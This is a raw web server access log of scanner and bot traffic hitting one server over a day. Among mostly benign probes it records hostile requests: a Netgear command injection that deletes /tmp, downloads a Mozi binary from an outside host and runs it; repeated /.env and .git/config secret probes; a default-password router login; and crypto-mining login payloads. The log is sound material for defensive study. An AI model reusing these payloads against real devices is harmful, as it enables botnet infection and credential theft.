135.125.217.54 - - [13/Oct/2024:00:03:26 +0000] "GET /.env HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [13/Oct/2024:00:03:26 +0000] "POST / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
147.185.133.86 - - [13/Oct/2024:00:04:01 +0000] "GET / HTTP/1.1" 200 1401 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
149.102.251.11 - - [13/Oct/2024:00:05:27 +0000] "GET /58uz HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux; rv:74.0) Gecko/20100101 Firefox/74.0"
149.102.251.11 - - [13/Oct/2024:00:05:31 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (X11; Linux; rv:74.0) Gecko/20100101 Firefox/74.0"
205.210.31.16 - - [13/Oct/2024:00:12:57 +0000] "\x16\x03\x01" 400 226 "-" "-"
205.210.31.16 - - [13/Oct/2024:00:12:57 +0000] "\x16\x03\x01" 400 226 "-" "-"
47.237.115.100 - - [13/Oct/2024:00:17:50 +0000] "\x16\x03\x01" 400 226 "-" "-"
91.90.42.154 - - [13/Oct/2024:00:18:25 +0000] "\x16\x03" 400 226 "-" "-"
91.90.42.154 - - [13/Oct/2024:00:18:25 +0000] "GET /peDC HTTP/1.1" 302 - "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)"
91.90.42.154 - - [13/Oct/2024:00:18:25 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)"
91.90.42.154 - - [13/Oct/2024:00:18:26 +0000] "GET /ded0 HTTP/1.1" 302 - "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)"
185.224.128.83 - - [13/Oct/2024:00:47:44 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 196 "-" "-"
93.174.93.12 - - [13/Oct/2024:01:03:10 +0000] "\x16\x03\x02\x01o\x01" 400 226 "-" "-"
135.125.217.54 - - [13/Oct/2024:01:04:22 +0000] "GET /.env HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [13/Oct/2024:01:04:22 +0000] "POST / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
44.220.185.97 - - [13/Oct/2024:02:04:25 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (Windows NT 6.2;en-US) AppleWebKit/537.32.36 (KHTML, live Gecko) Chrome/53.0.3028.97 Safari/537.32"
198.235.24.150 - - [13/Oct/2024:02:09:04 +0000] "GET / HTTP/1.1" 200 1401 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
178.211.139.188 - - [13/Oct/2024:03:02:58 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
111.224.192.204 - - [13/Oct/2024:03:04:12 +0000] "HEAD / HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0"
135.125.217.54 - - [13/Oct/2024:03:06:41 +0000] "GET /.env HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [13/Oct/2024:03:06:41 +0000] "POST / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
192.210.199.34 - - [13/Oct/2024:03:17:06 +0000] "GET /bZ4l HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36"
80.239.140.67 - - [13/Oct/2024:03:17:06 +0000] "\x16\x03\x01\x02" 400 226 "-" "-"
87.120.127.173 - - [13/Oct/2024:03:20:06 +0000] "GET /.env HTTP/1.1" 302 - "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_8; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.302.2 Safari/532.8"
5.8.11.202 - - [13/Oct/2024:03:24:53 +0000] "GET / HTTP/1.0" 200 1401 "-" "Mozilla/5.0 (Linux; Android 9; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36"
185.224.128.47 - - [13/Oct/2024:03:27:12 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
185.73.23.139 - - [13/Oct/2024:03:37:01 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 zgrab/2.0 http://cdn-measurements.softsec.rub.de/"
18.218.254.105 - - [13/Oct/2024:03:43:23 +0000] "GET /.git/config HTTP/1.1" 302 - "-" "Mozilla/5.0 (Linux; Android 8.1.0; Redmi 6 Pro Build/OPM1.171019.019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36"
111.224.192.204 - - [13/Oct/2024:04:32:26 +0000] "HEAD /match HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0"
139.59.140.227 - - [13/Oct/2024:04:49:16 +0000] "GET / HTTP/1.0" 200 1401 "-" "-"
139.59.140.227 - - [13/Oct/2024:04:49:16 +0000] "GET / HTTP/1.0" 200 1401 "-" "-"
139.59.140.227 - - [13/Oct/2024:04:49:16 +0000] "POST /sdk HTTP/1.1" 302 - "-" "Mozilla/5.0 (compatible; Odin; https://docs.getodin.com/)"
139.59.140.227 - - [13/Oct/2024:04:49:16 +0000] "GET /odinhttpcall1728794956 HTTP/1.1" 302 - "-" "Mozilla/5.0 (compatible; Odin; https://docs.getodin.com/)"
139.59.140.227 - - [13/Oct/2024:04:49:17 +0000] "GET /HNAP1 HTTP/1.1" 302 - "-" "Mozilla/5.0 (compatible; Odin; https://docs.getodin.com/)"
139.59.140.227 - - [13/Oct/2024:04:49:17 +0000] "GET /evox/about HTTP/1.1" 302 - "-" "Mozilla/5.0 (compatible; Odin; https://docs.getodin.com/)"
139.59.140.227 - - [13/Oct/2024:04:49:17 +0000] "GET / HTTP/1.0" 200 1401 "-" "-"
139.59.140.227 - - [13/Oct/2024:04:49:17 +0000] "GET / HTTP/1.1" 200 1401 "-" "-"
164.90.235.22 - - [13/Oct/2024:04:49:17 +0000] "\x16\x03\x01" 400 226 "-" "-"
164.90.191.44 - - [13/Oct/2024:04:49:17 +0000] "GET /query?q=SHOW+DIAGNOSTICS HTTP/1.1" 302 - "-" "Go-http-client/1.1"
164.90.178.225 - - [13/Oct/2024:04:49:17 +0000] "GET /v2/_catalog HTTP/1.1" 302 - "-" "Go-http-client/1.1"
167.99.129.81 - - [13/Oct/2024:04:49:17 +0000] "GET /cgi-bin/authLogin.cgi HTTP/1.1" 404 196 "-" "Go-http-client/1.1"
164.90.235.74 - - [13/Oct/2024:04:49:17 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (compatible; Odin; https://docs.getodin.com/)"
164.90.235.74 - - [13/Oct/2024:04:49:17 +0000] "GET /solr/admin/info/system HTTP/1.1" 302 - "-" "Go-http-client/1.1"
164.90.189.37 - - [13/Oct/2024:04:49:17 +0000] "\x16\x03\x01\x01$\x01" 400 226 "-" "-"
164.90.235.22 - - [13/Oct/2024:04:49:17 +0000] "\x16\x03\x01" 400 226 "-" "-"
164.90.178.225 - - [13/Oct/2024:04:49:17 +0000] "GET / HTTP/1.1" 200 1401 "http://54.224.97.58:80/v2/_catalog" "Go-http-client/1.1"
164.90.191.44 - - [13/Oct/2024:04:49:17 +0000] "GET / HTTP/1.1" 200 1401 "http://54.224.97.58:80/query?q=SHOW+DIAGNOSTICS" "Go-http-client/1.1"
164.90.235.74 - - [13/Oct/2024:04:49:17 +0000] "GET / HTTP/1.1" 200 1401 "http://54.224.97.58:80/solr/admin/info/system" "Go-http-client/1.1"
164.90.235.22 - - [13/Oct/2024:04:49:18 +0000] "\x16\x03\x01" 400 226 "-" "-"
164.90.235.74 - - [13/Oct/2024:04:49:18 +0000] "GET /solr/admin/cores?action=STATUS&wt=json HTTP/1.1" 302 - "-" "Go-http-client/1.1"
164.90.235.74 - - [13/Oct/2024:04:49:18 +0000] "GET / HTTP/1.1" 200 1401 "http://54.224.97.58:80/solr/admin/cores?action=STATUS&wt=json" "Go-http-client/1.1"
135.125.217.54 - - [13/Oct/2024:05:03:24 +0000] "GET /.env HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [13/Oct/2024:05:03:24 +0000] "POST / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
91.90.42.154 - - [13/Oct/2024:05:30:02 +0000] "\x16\x03" 400 226 "-" "-"
91.90.42.154 - - [13/Oct/2024:05:30:02 +0000] "GET /BMUx HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.1.18) Gecko/20081029 Firefox/2.0.0.18"
91.90.42.154 - - [13/Oct/2024:05:30:02 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.1.18) Gecko/20081029 Firefox/2.0.0.18"
91.90.42.154 - - [13/Oct/2024:05:30:02 +0000] "GET /P0yd HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.1.18) Gecko/20081029 Firefox/2.0.0.18"
80.82.77.202 - - [13/Oct/2024:05:32:34 +0000] "\x16\x03\x02\x01o\x01" 400 226 "-" "-"
43.130.3.122 - - [13/Oct/2024:05:48:53 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
178.192.152.32 - - [13/Oct/2024:06:22:03 +0000] "GET / HTTP/1.0" 200 1401 "-" "Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
135.125.217.54 - - [13/Oct/2024:06:34:25 +0000] "GET /.env HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [13/Oct/2024:06:34:26 +0000] "POST / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
45.84.89.2 - - [13/Oct/2024:07:49:43 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/6.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Inspici (www.inspici.com)"
172.202.177.248 - - [13/Oct/2024:07:51:27 +0000] "GET /hudson HTTP/1.1" 302 - "-" "Mozilla/5.0 zgrab/0.x"
135.125.217.54 - - [13/Oct/2024:08:02:07 +0000] "GET /.env HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [13/Oct/2024:08:02:08 +0000] "POST / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
143.244.63.95 - - [13/Oct/2024:08:23:16 +0000] "\x16\x03\x01\x02" 400 226 "-" "-"
93.123.85.155 - - [13/Oct/2024:08:26:04 +0000] "GET /.env HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
93.123.85.155 - - [13/Oct/2024:08:26:04 +0000] "POST / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
149.102.251.11 - - [13/Oct/2024:09:08:21 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 Gecko/20100101 Firefox/91.0"
217.148.140.139 - - [13/Oct/2024:09:08:21 +0000] "\x16\x03\x03\x01\xa5\x01" 400 226 "-" "-"
217.148.140.139 - - [13/Oct/2024:09:08:21 +0000] "\x16\x03\x03\x01\xa5\x01" 400 226 "-" "-"
217.148.140.139 - - [13/Oct/2024:09:08:21 +0000] "\x16\x03\x03\x01V\x01" 400 226 "-" "-"
149.102.251.11 - - [13/Oct/2024:09:08:22 +0000] "GET /58uz HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux; rv:74.0) Gecko/20100101 Firefox/74.0"
217.148.140.139 - - [13/Oct/2024:09:08:22 +0000] "\x16\x03\x03\x01H\x01" 400 226 "-" "-"
217.148.140.139 - - [13/Oct/2024:09:08:22 +0000] "\x16\x03\x03\x01\x99\x01" 400 226 "-" "-"
217.148.140.139 - - [13/Oct/2024:09:08:22 +0000] "\x16\x03\x02\x01\x9a\x01" 400 226 "-" "-"
217.148.140.139 - - [13/Oct/2024:09:08:22 +0000] "\x16\x03\x01\x01\xa7\x01" 400 226 "-" "-"
149.102.251.11 - - [13/Oct/2024:09:08:22 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (X11; Linux; rv:74.0) Gecko/20100101 Firefox/74.0"
217.148.140.139 - - [13/Oct/2024:09:08:22 +0000] "\x16\x03\x01\x01\xa7\x01" 400 226 "-" "-"
217.148.140.139 - - [13/Oct/2024:09:08:22 +0000] "\x16\x03\x01\x01\x9d\x01" 400 226 "-" "-"
217.148.140.139 - - [13/Oct/2024:09:08:22 +0000] "\x16\x03\x01\x01\xb4\x01" 400 226 "-" "-"
185.91.69.110 - - [13/Oct/2024:09:24:33 +0000] "\x16\x03\x01\x02" 400 226 "-" "-"
185.91.69.110 - - [13/Oct/2024:09:24:34 +0000] "{\"id\": 1, \"method\": \"mining.subscribe\", \"params\": [\"cpuminer/2.5.1\"]}\n" 400 226 "-" "-"
185.91.69.110 - - [13/Oct/2024:09:24:34 +0000] "{\"id\": 1, \"method\": \"mining.subscribe\", \"params\": [\"MinerName/1.0.0\", \"EthereumStratum/1.0.0\"]}\n" 400 226 "-" "-"
185.91.69.110 - - [13/Oct/2024:09:24:35 +0000] "{\"id\":1,\"method\":\"eth_submitLogin\",\"worker\":\"igwrcvap\",\"params\":[\"0x6d3666620e231a5fd2b67b9b97aa5ce99f43df99\",\"x\"],\"jsonrpc\":\"2.0\"}\n" 400 226 "-" "-"
185.91.69.110 - - [13/Oct/2024:09:24:37 +0000] "{\"id\":1,\"jsonrpc\":\"2.0\",\"method\":\"login\",\"params\":{\"login\":\"4AT5fTuqN5X5XXjXAr5jwKA5hcNsQpAgGixrkBKHVWwBDnioj9svrfrhty9C6ERmPYKMfYRceTqnQ1FfBmCTL94Y1ijcPkk\",\"pass\":\"x\",\"agent\":\"XMRig/6.15.3 (Windows NT 10.0; Win64; x64) libuv/1.42.0 msvc/2019\",\"algo\":[\"cn/1\",\"cn/2\",\"cn/r\",\"cn/fast\",\"cn/half\",\"cn/xao\",\"cn/rto\",\"cn/rwz\",\"cn/zls\",\"cn/double\",\"cn/ccx\",\"cn-lite/1\",\"cn-heavy/0\",\"cn-heavy/tube\",\"cn-heavy/xhv\",\"cn-pico\",\"cn-pico/tlo\",\"cn/upx2\",\"rx/0\",\"rx/wow\",\"rx/arq\",\"rx/graft\",\"rx/sfx\",\"rx/keva\",\"argon2/chukwa\",\"argon2/chukwav2\",\"argon2/ninja\",\"astrobwt\"]}}\n" 400 226 "-" "-"
185.91.69.110 - - [13/Oct/2024:09:24:38 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
185.91.69.110 - - [13/Oct/2024:09:24:38 +0000] "POST / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
185.91.69.110 - - [13/Oct/2024:09:24:39 +0000] "POST / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
185.91.69.110 - - [13/Oct/2024:09:24:40 +0000] "GET /WuEL HTTP/1.1" 302 - "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; ; NCLIENT50_AAPCDA5841E333)"
185.91.69.110 - - [13/Oct/2024:09:24:41 +0000] "GET stager64 HTTP/1.1" 400 226 "-" "-"
185.91.69.110 - - [13/Oct/2024:09:24:41 +0000] "GET /a HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
185.91.69.110 - - [13/Oct/2024:09:24:43 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
185.91.69.110 - - [13/Oct/2024:09:24:43 +0000] "GET /download/file.ext HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
185.91.69.110 - - [13/Oct/2024:09:24:44 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
185.91.69.110 - - [13/Oct/2024:09:24:45 +0000] "GET /SiteLoader HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
185.91.69.110 - - [13/Oct/2024:09:24:46 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
185.91.69.110 - - [13/Oct/2024:09:24:46 +0000] "GET /mPlayer HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
185.91.69.110 - - [13/Oct/2024:09:24:47 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
185.91.69.110 - - [13/Oct/2024:09:24:48 +0000] "POST / HTTP/1.1" 400 226 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
217.148.140.139 - - [13/Oct/2024:09:29:48 +0000] "GET randomURL HTTP/1.1" 400 226 "-" "-"
217.148.140.139 - - [13/Oct/2024:09:29:48 +0000] "GET beacon.http-get HTTP/1.1" 400 226 "-" "-"
91.90.42.154 - - [13/Oct/2024:09:51:24 +0000] "\x16\x03" 400 226 "-" "-"
91.90.42.154 - - [13/Oct/2024:09:51:24 +0000] "GET /XJhR HTTP/1.1" 302 - "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
91.90.42.154 - - [13/Oct/2024:09:51:24 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
91.90.42.154 - - [13/Oct/2024:09:51:24 +0000] "GET /H2vm HTTP/1.1" 302 - "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
135.125.217.54 - - [13/Oct/2024:10:03:58 +0000] "GET /.env HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [13/Oct/2024:10:03:59 +0000] "POST / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.224.128.83 - - [13/Oct/2024:10:14:28 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 196 "-" "-"
135.125.217.54 - - [13/Oct/2024:10:49:13 +0000] "GET /.env HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [13/Oct/2024:10:49:13 +0000] "POST / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
204.101.161.19 - - [13/Oct/2024:10:55:08 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0"
204.101.161.19 - - [13/Oct/2024:10:55:08 +0000] "GET /css/login.css HTTP/1.1" 200 620 "http://54.224.97.58/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0"
204.101.161.19 - - [13/Oct/2024:10:55:08 +0000] "GET /js/brand.js HTTP/1.1" 200 429 "http://54.224.97.58/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0"
204.101.161.19 - - [13/Oct/2024:10:55:08 +0000] "GET /js/login.js HTTP/1.1" 200 1751 "http://54.224.97.58/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0"
204.101.161.19 - - [13/Oct/2024:10:55:09 +0000] "GET /js/services/LoggerService.js HTTP/1.1" 200 2461 "http://54.224.97.58/js/login.js" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0"
204.101.161.19 - - [13/Oct/2024:10:55:18 +0000] "GET /favicon.ico HTTP/1.1" 302 - "-" "-"
204.101.161.19 - - [13/Oct/2024:10:55:20 +0000] "GET /js/login.js HTTP/1.1" 200 1751 "-" "-"
204.101.161.19 - - [13/Oct/2024:10:55:20 +0000] "GET /js/brand.js HTTP/1.1" 200 429 "-" "-"
204.101.161.19 - - [13/Oct/2024:10:55:20 +0000] "GET /js/services/LoggerService.js HTTP/1.1" 200 2461 "-" "-"
185.224.128.47 - - [13/Oct/2024:11:37:43 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
5.8.11.202 - - [13/Oct/2024:11:49:52 +0000] "\x16\x03\x02\x01o\x01" 400 226 "-" "-"
135.125.217.54 - - [13/Oct/2024:12:10:03 +0000] "GET /.env HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [13/Oct/2024:12:10:04 +0000] "POST / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
73.179.114.130 - - [13/Oct/2024:12:10:59 +0000] "GET / HTTP/1.0" 200 1401 "-" "Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
40.78.88.216 - - [13/Oct/2024:12:19:00 +0000] "MGLNDD_54.224.97.58_80\n" 400 226 "-" "-"
61.3.215.147 - - [13/Oct/2024:12:24:52 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://61.3.215.147:50067/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 302 - "-" "-"
58.49.233.126 - - [13/Oct/2024:12:50:55 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
170.106.171.77 - - [13/Oct/2024:13:03:52 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
135.125.246.110 - - [13/Oct/2024:13:08:38 +0000] "GET /.env HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.110 - - [13/Oct/2024:13:08:38 +0000] "POST / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.60.214.113 - - [13/Oct/2024:13:09:29 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (Fedora; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36"
105.112.198.105 - - [13/Oct/2024:13:13:00 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0"
105.112.198.105 - - [13/Oct/2024:13:13:01 +0000] "GET /nice%20ports%2C/Tri%6Eity.txt%2ebak HTTP/1.0" 302 - "-" "-"
59.183.133.16 - - [13/Oct/2024:13:20:47 +0000] "GET /boaform/admin/formLogin?username=adminisp&psd=adminisp HTTP/1.0" 302 - "-" "-"
89.40.181.202 - - [13/Oct/2024:13:22:32 +0000] "\x16\x03\x01\x02" 400 226 "-" "-"
80.82.77.202 - - [13/Oct/2024:13:22:43 +0000] "GET / HTTP/1.0" 200 1401 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.35 Safari/537.36"
130.185.255.230 - - [13/Oct/2024:13:22:44 +0000] "GET /rO4g HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.107 Safari/537.36"
138.197.213.92 - - [13/Oct/2024:13:23:47 +0000] "\x16\x03\x01" 400 226 "-" "-"
138.197.213.92 - - [13/Oct/2024:13:23:47 +0000] "\x16\x03\x01" 400 226 "-" "-"
138.197.213.92 - - [13/Oct/2024:13:23:47 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
138.197.213.92 - - [13/Oct/2024:13:23:47 +0000] "GET /form.html HTTP/1.1" 302 - "-" "curl/8.1.2"
138.197.213.92 - - [13/Oct/2024:13:23:47 +0000] "GET /upl.php HTTP/1.1" 302 - "-" "Mozilla/5.0"
138.197.213.92 - - [13/Oct/2024:13:23:48 +0000] "GET /t4 HTTP/1.1" 302 - "-" "Mozilla/5.0"
138.197.213.92 - - [13/Oct/2024:13:23:48 +0000] "GET /geoip/ HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
